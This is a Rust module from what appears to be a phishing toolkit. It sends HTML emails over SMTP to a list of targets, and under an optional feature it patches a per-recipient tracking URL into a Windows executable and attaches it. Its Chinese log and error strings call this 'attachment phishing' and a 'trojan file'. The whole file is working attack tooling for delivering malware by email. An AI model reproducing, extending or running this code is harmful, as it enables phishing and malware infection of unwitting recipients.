use lettre::Message;
use lettre::message::header::ContentType;
use lettre::message::{MultiPart, Attachment, Body};
use lettre::transport::smtp::authentication::Credentials;
use lettre::{SmtpTransport, Transport};
use std::error::Error;
use std::fs::{self, create_dir_all, canonicalize};
use std::path::Path;
use mime_guess::MimeGuess;

use crate::config::*;
use crate::db::EmailEntry;

#[cfg(feature = "appendix")]
use crate::malware::patch_tool::replace_url_in_exe_rdata;

pub fn verify_smtp_credentials(
    smtp_server: SmtpServer,
    password: &str,
) -> Result<Credentials, Box<dyn Error>> {
    let creds = Credentials::new(smtp_server.username.to_string(), password.to_string());

    // 创建SMTP传输器
    let mailer = match smtp_server.use_default_smtp_port {
        true => {
            SmtpTransport::relay(&smtp_server.server)?
                .credentials(creds.clone())
                .build()
        },
        false => {
            SmtpTransport::builder_dangerous(smtp_server.server)
                .port(smtp_server.force_smtp_port)
                .credentials(creds.clone())
                .build()
        }
    };
    // 尝试连接以验证凭证
    mailer.test_connection()?;

    Ok(creds)
}

pub fn send_html_email(
    smtp_server: &SmtpServer,
    email_sending: &EmailSending,
    password: &str,
    entry: EmailEntry,
    generated_html: &str
) -> Result<(), Box<dyn Error>> {
    // 每封邮件验证一次凭证，避免长时间发送过程中凭证过期
    let creds = verify_smtp_credentials(smtp_server.clone(), password)?;

    // 读取HTML文件
    let html_content = fs::read_to_string(generated_html)?;

    // 构建邮件
    let base_email = Message::builder()
        .from(email_sending.from_email.parse()?)
        .to(entry.email.parse()?)
        .subject(email_sending.subject.clone());
    
    let multipart = add_attachment(&html_content, &email_sending.original_appendix_path,  &entry.id, email_sending.use_appendix, &email_sending.appendix_name_for_sending)?;

    let email = base_email.multipart(multipart)?;

    let mailer = match smtp_server.use_default_smtp_port {
        true => {
            SmtpTransport::relay(&smtp_server.server)?
                .credentials(creds)
                .build()
        },
        false => {
            SmtpTransport::builder_dangerous(smtp_server.server.clone())
                .port(smtp_server.force_smtp_port)
                .credentials(creds)
                .build()
        }
    };

    mailer.send(&email)?;

    Ok(())
}

fn ensure_exe_suffix(s: &str) -> String {
    if s.ends_with(".exe") {
        s.to_string()
    } else {
        format!("{}.exe", s)
    }
}

fn add_attachment(
    html_content: &str,
    original_appendix_name_exe: &str,
    entry_id: &str,
    use_appendix: bool,
    appendix_name_for_sending: &str,
) -> Result<MultiPart, Box<dyn Error>> {
    let appendix_name_for_sending = ensure_exe_suffix(appendix_name_for_sending);
    let mpart = MultiPart::mixed()
        .singlepart(
            lettre::message::SinglePart::builder()
                .header(lettre::message::header::ContentType::TEXT_HTML)
                .body(html_content.to_string())
        );

    #[cfg(not(feature = "appendix"))]
    match use_appendix {
        true => {
            return Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                "你的程序没有编译appendix功能，不支持附件钓鱼，请修改你的配置文件"
            )))

        },
        false => {
            return Ok(mpart);
        }
    }

    #[cfg(feature = "appendix")]
    match use_appendix {
        true => {
            let temp = format!("./temp/appendix-exe/{}", entry_id);
            let temp_clone = temp.clone();
            let temp_dir = Path::new(&temp_clone);
            create_dir_all(temp_dir)?;

            let temp_file = format!("./{}/{}", temp, appendix_name_for_sending);

            let entry_url = format!("appendix/{}", entry_id);

            match replace_url_in_exe_rdata(&original_appendix_name_exe, &temp_file, &entry_url) {
                Ok(_) => {
                    let path = Path::new(&appendix_name_for_sending);
                    let mime_str = MimeGuess::from_path(path)
                        .first_or_octet_stream()
                        .essence_str().to_string(); 

                    crate::print_success(&format!("成功创建木马文件 {}", entry_id));
                    let body = fs::read(&temp_file)?;

                    fs::remove_file(&temp_file)?;

                    return Ok(mpart.singlepart(
                        Attachment::new(appendix_name_for_sending.to_string())
                            .body(body, ContentType::parse(&mime_str)?)
                    ))

                }
                Err(_e) => {
                    return Err(Box::new(std::io::Error::new(
                        std::io::ErrorKind::NotFound,
                        "生成文件失败",
                    )))
                }
            }

        },
        false => {
            return Ok(mpart);
        }
    }

}
